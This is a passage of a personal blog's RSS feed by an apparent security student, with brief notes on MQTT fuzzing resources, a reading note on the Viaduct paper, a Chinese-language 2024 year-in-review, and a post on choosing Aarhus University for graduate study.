-&lt;p&gt;&lt;a href=&#34;https://github.com/luisgar1990/MQTTGRAM/blob/master/generator.py&#34;&gt;https://github.com/luisgar1990/MQTTGRAM/blob/master/generator.py&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;using-libfuzzer-for-structure-aware-fuzzing&#34; &gt;Using libfuzzer for structure aware fuzzing
-&lt;span&gt;
-    &lt;a href=&#34;#using-libfuzzer-for-structure-aware-fuzzing&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md&#34;&gt;https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;structure-aware-vs-llm-generator&#34; &gt;Structure Aware VS LLM Generator
-&lt;span&gt;
-    &lt;a href=&#34;#structure-aware-vs-llm-generator&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;pass&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/MPFuzz/MPFuzz/blob/0d413ccec8855ad356aa382e1709cf28dc3d2622/executable/samples/mqtt_data.xml&#34;&gt;https://github.com/MPFuzz/MPFuzz/blob/0d413ccec8855ad356aa382e1709cf28dc3d2622/executable/samples/mqtt_data.xml&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;mutate如何实现的&lt;/p&gt;
-&lt;h2 id=&#34;some-solution&#34; &gt;Some solution
-&lt;span&gt;
-    &lt;a href=&#34;#some-solution&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;Using LLM: &lt;a href=&#34;https://arxiv.org/html/2501.19282v1&#34;&gt;https://arxiv.org/html/2501.19282v1&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;能猜一下 &lt;a href=&#34;https://github.com/advisories/GHSA-cwr9-w5qw-fr62&#34;&gt;https://github.com/advisories/GHSA-cwr9-w5qw-fr62&lt;/a&gt; 怎么出的吗
-&lt;a href=&#34;https://github.com/nanomq/NanoNNG/blob/c86a8064edd6cfcdf706b68ed7eb175d2a77da47/src/sp/protocol/mqtt/mqtt_parser.c&#34;&gt;https://github.com/nanomq/NanoNNG/blob/c86a8064edd6cfcdf706b68ed7eb175d2a77da47/src/sp/protocol/mqtt/mqtt_parser.c&lt;/a&gt;&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>Paper Reading Note - Viaduct</title>
-      <link>https://BestRun.github.io/posts/paper-reading-note-viaduct/</link>
-      <pubDate>Fri, 18 Apr 2025 15:41:53 +0200</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/paper-reading-note-viaduct/</guid>
-      <description>&lt;h2 id=&#34;introduction&#34; &gt;Introduction
-&lt;span&gt;
-    &lt;a href=&#34;#introduction&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;two weeks later, my teammate and I  will present a paper &amp;ndash; Viaduct
-Let&amp;rsquo;s follow the instructions given by our prof!&lt;/p&gt;
-&lt;h2 id=&#34;how-to-read-a-research-paper&#34; &gt;How to read a research paper
-&lt;span&gt;
-    &lt;a href=&#34;#how-to-read-a-research-paper&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;You may find if useful to ask yourself the following questions as you read the paper, or after you read the paper. &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;What problem is the paper addressing? How well do they succeed in solving the problem? &lt;/li&gt;
-&lt;li&gt;What is the contribution of the paper? How important is this contribution? &lt;/li&gt;
-&lt;li&gt;How would you have addressed the problem? &lt;/li&gt;
-&lt;li&gt;What was unclear to you? &lt;/li&gt;
-&lt;li&gt;How does the paper relate to other papers we have read or studied? &lt;/li&gt;
-&lt;li&gt;Are there any obvious or non-obvious extensions to this work? &lt;/li&gt;
-&lt;li&gt;Can you suggest a two-sentence project idea based on the ideas of this paper? &lt;/li&gt;
-&lt;li&gt;Here is a more elaborate discussion on &lt;a href=&#34;http://www.eecs.harvard.edu/~michaelm/postscripts/ReadPaper.pdf&#34;&gt;how to read a research paper&lt;/a&gt; by Michael Mitzenmacher.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;paper-reading&#34; &gt;Paper Reading
-&lt;span&gt;
-    &lt;a href=&#34;#paper-reading&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s solve these problems step by step!&lt;/p&gt;
-&lt;h3 id=&#34;1-what-problem-is-the-paper-addressing-how-well-do-they-succeed-in-solving-the-problem&#34; &gt;1. What problem is the paper addressing? How well do they succeed in solving the problem? 
-&lt;span&gt;
-    &lt;a href=&#34;#1-what-problem-is-the-paper-addressing-how-well-do-they-succeed-in-solving-the-problem&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;h3 id=&#34;how-would-you-have-addressed-the-problem&#34; &gt;How would you have addressed the problem? 
-&lt;span&gt;
-    &lt;a href=&#34;#how-would-you-have-addressed-the-problem&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;Using threat model is a good solution I think.&lt;/p&gt;
-&lt;p&gt;Compiled programs run across multiple hosts, each executing a single thread and communicating via secure, asynchronous message-passing, with no shared memory. Timing attacks are out of scope, and availability is not guaranteed. In Viaduct&amp;rsquo;s model, each host may consider others as potential attackers, depending on the context (e.g., Alice vs. Bob in the millionaires problem). Attacker capabilities are modeled via &lt;em&gt;labels&lt;/em&gt; that determine what data they can read (confidentiality) or modify (integrity). Full corruption of a single host is not feasible if mutual trust exists, as corruption of one’s integrity implies corruption of the other&amp;rsquo;s as well.&lt;/p&gt;
-&lt;h2 id=&#34;presenting-papers&#34; &gt;Presenting papers
-&lt;span&gt;
-    &lt;a href=&#34;#presenting-papers&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;Things to think about when preparing your presentation:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Your primary goal is to clearly communicate the key ideas of the paper. In order to do this, you may need to read some of the related work, and you may need to present background material.&lt;/li&gt;
-&lt;li&gt;Your secondary goal is to prompt discussion about the papers.&lt;/li&gt;
-&lt;li&gt;You do not have time to cover every detail of the paper. Focus instead on the important and/or interesting aspects of the paper.&lt;/li&gt;
-&lt;li&gt;The structure of the paper is often useful as the structure of your presentation. However, this is not always the case. Make a conscious decision about how you will structure your presentation, and why.&lt;/li&gt;
-&lt;li&gt;Do not read aloud the text on your slides.&lt;/li&gt;
-&lt;li&gt;For advice on giving good presentations, see, for example, &lt;a href=&#34;http://pages.cs.wisc.edu/~markhill/conference-talk.html&#34;&gt;Mark Hill&amp;rsquo;s advice&lt;/a&gt;, &lt;a href=&#34;http://www.matthewjmiller.net/ramblings/presentation-tips/&#34;&gt;Matthew Miller&amp;rsquo;s tips&lt;/a&gt;, or Simon Peyton Jones&amp;rsquo; slides on how to give a good research talk (via Mark Leone&amp;rsquo;s advice &lt;a href=&#34;https://www.cs.cmu.edu/~mleone/how-to.html&#34;&gt;website&lt;/a&gt;).&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;related-work--background-material&#34; &gt;related work &amp;amp; background material
-&lt;span&gt;
-    &lt;a href=&#34;#related-work--background-material&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;h4 id=&#34;historical-millionaires-problem&#34; &gt;Historical Millionaires’ Problem
-&lt;span&gt;
-    &lt;a href=&#34;#historical-millionaires-problem&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;p&gt;&lt;em&gt;The Millionaire’s Problem, introduced by Andy Yao in 1982, began the study of privacy-preserving multiparty computation. Alice and Bob want to know who is the richer without revealing how much they are actually worth.&lt;/em&gt;
-&lt;a href=&#34;https://zoo.cs.yale.edu/classes/cs461/2009/lectures/ln21.pdf&#34;&gt;https://zoo.cs.yale.edu/classes/cs461/2009/lectures/ln21.pdf&lt;/a&gt;&lt;/p&gt;
-&lt;img src=&#34;Pasted image 20250418160430.png&#34; alt=&#34;示例图片&#34; width=&#34;500&#34; height=&#34;300&#34;&gt;
-&lt;h4 id=&#34;a-simple-introduction-for-every-protocol&#34; &gt;A simple introduction for every protocol
-&lt;span&gt;
-    &lt;a href=&#34;#a-simple-introduction-for-every-protocol&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;img src=&#34;Pasted image 20250418165358.png&#34; alt=&#34;示例图片&#34; width=&#34;500&#34; height=&#34;300&#34;&gt;</description>
-    </item>
-    
-    <item>
-      <title>2024年终总结</title>
-      <link>https://BestRun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
-      <pubDate>Tue, 31 Dec 2024 21:42:27 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
-      <description>&lt;h2 id=&#34;序&#34; &gt;序
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%ba%8f&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;江湖，是少年人的江湖。&lt;/p&gt;
-&lt;p&gt;希望我未来可以，攀更高的山峰，看更美的风景，遇见更优秀的她，哈哈哈，快哉快哉。&lt;/p&gt;
-&lt;p&gt;我们就一起来看看今年都发生了什么吧。&lt;/p&gt;
-&lt;h2 id=&#34;传&#34; &gt;传
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%bc%a0&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;忆往昔峥嵘岁月：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;开始健身。和好兄弟们吃了n次海鲜自助。&lt;/li&gt;
-&lt;li&gt;在n次尝试后，拿下雅思。😂&lt;/li&gt;
-&lt;li&gt;挖到数个网络协议漏洞。&lt;/li&gt;
-&lt;li&gt;瓦洛兰特上钻石。&lt;/li&gt;
-&lt;li&gt;今年成功答辩，完成了一份我自我满意的毕业设计。也标志着本科期间在网络领域研究的结束。&lt;/li&gt;
-&lt;li&gt;拿到北欧offer。&lt;/li&gt;
-&lt;li&gt;带队字节AI安全比赛🥉。&lt;/li&gt;
-&lt;li&gt;Datacon大数据安全挑战赛AI安全赛道🥉。&lt;/li&gt;
-&lt;li&gt;完成 Blackhat Aisa投稿。&lt;/li&gt;
-&lt;li&gt;全国旅游。南京 -&amp;gt; 成都 -&amp;gt;  九寨沟 -&amp;gt; 大理 -&amp;gt;  丽江 -&amp;gt;  陕西。&lt;/li&gt;
-&lt;li&gt;人生第一次徒步 &amp;ndash; 虎跳峡。并爱上了徒步。徒步中收获很多友谊。&lt;/li&gt;
-&lt;li&gt;拿到北欧5年签证。&lt;/li&gt;
-&lt;li&gt;入手人生第一台相机A7C2。&lt;/li&gt;
-&lt;li&gt;软件所实习年数+1&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;折戟沙场：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;未能找到女朋友😭&lt;/li&gt;
-&lt;li&gt;FUZZ论文还是没写出来 555😭&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;展望未来：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;找个岗位制博士读读。&lt;/li&gt;
-&lt;li&gt;去北欧徒步，去看最好的风景。&lt;/li&gt;
-&lt;li&gt;收获更多友谊。&lt;/li&gt;
-&lt;li&gt;技术上能有更大突破。&lt;/li&gt;
-&lt;li&gt;遇见最好的她。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;江湖，是少年人的江湖。
-希望我未来可以，攀更高的山峰，看更美的风景，遇见更优秀的她，哈哈哈，快哉快哉。&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>人生</title>
-      <link>https://BestRun.github.io/life/master/</link>
-      <pubDate>Fri, 25 Oct 2024 10:57:24 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/life/master/</guid>
-      <description>&lt;p&gt;失败总是贯穿人生始终,这就是人生。 &amp;ndash; showmaker&lt;/p&gt;
-&lt;h2 id=&#34;写在前面&#34; &gt;写在前面
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%86%99%e5%9c%a8%e5%89%8d%e9%9d%a2&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;很久没动过博客了，本来计划是全英文写作+知识博客，没想到现在竟变成了我碎碎念的地方。&lt;/p&gt;
-&lt;p&gt;一般大家都会在年底写博客，回顾一年里的光辉事迹，但像我这种闲人，散人，自然是没这么多顾虑。&lt;/p&gt;
-&lt;p&gt;既然不是年终总结，那就随意谈谈我最近的状况。&lt;/p&gt;
-&lt;h2 id=&#34;留学进展&#34; &gt;留学进展
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%95%99%e5%ad%a6%e8%bf%9b%e5%b1%95&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;由于对🇬🇧学校的学术能力质疑，我便放弃了24fall的offer，并寻求25spring的机会。
-我申请了以下几个学校，最后大概是要去奥胡斯了。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;NUS CE x&lt;/li&gt;
-&lt;li&gt;NTU CCA （没结果）&lt;/li&gt;
-&lt;li&gt;Aarhus CE offer made（至于为什么不是cs， 我还想问为什么这些学校春季入学都不开cs&amp;hellip;）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;说实话奥胡斯可能真没几个人听说过，排名也不高，所以为什么选择奥胡斯？
-我将从以下几个方面给出解答&lt;/p&gt;
-&lt;h3 id=&#34;学制&#34; &gt;学制
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%ad%a6%e5%88%b6&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;北欧的学制是两年，并且两年开销 = 一年英国水硕开销，此为一胜。&lt;/li&gt;
-&lt;li&gt;两年学制所以平均每学期课程少，有大把时间实习or科研，此为二胜。&lt;/li&gt;
-&lt;li&gt;北欧的thesis可以在公司或者直接去别的学校做，提前打好connection，此为三胜。&lt;/li&gt;
-&lt;li&gt;北欧🇨🇳人少，不会导致反向留学，此为四胜。&lt;/li&gt;
-&lt;li&gt;实在不济，奥胡斯本校一年有75个博士岗位，此为五胜。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;csranking&#34; &gt;CSRanking
-&lt;span&gt;
-    &lt;a href=&#34;#csranking&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;众所周知，Qs是野榜，CSranking更是野榜。
-可以看到Aarhus University的排名在欧洲处于15名附近。与之相近的有CISPA（未来想去读博的地方），比牛剑帝国理工排名低了一点。至少在计算机上的排名还是靠谱的。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/202410251128.png&#34; alt=&#34;描述&#34; width=&#34;500&#34; height=&#34;400&#34;&gt;
-&lt;h3 id=&#34;教授质量&#34; &gt;教授质量
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%95%99%e6%8e%88%e8%b4%a8%e9%87%8f&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;我之前虽然拿到的🇬🇧offer排名比较靠前，但我翻遍了学院的教授名单还是找不到一位做软件安全相关的教授。
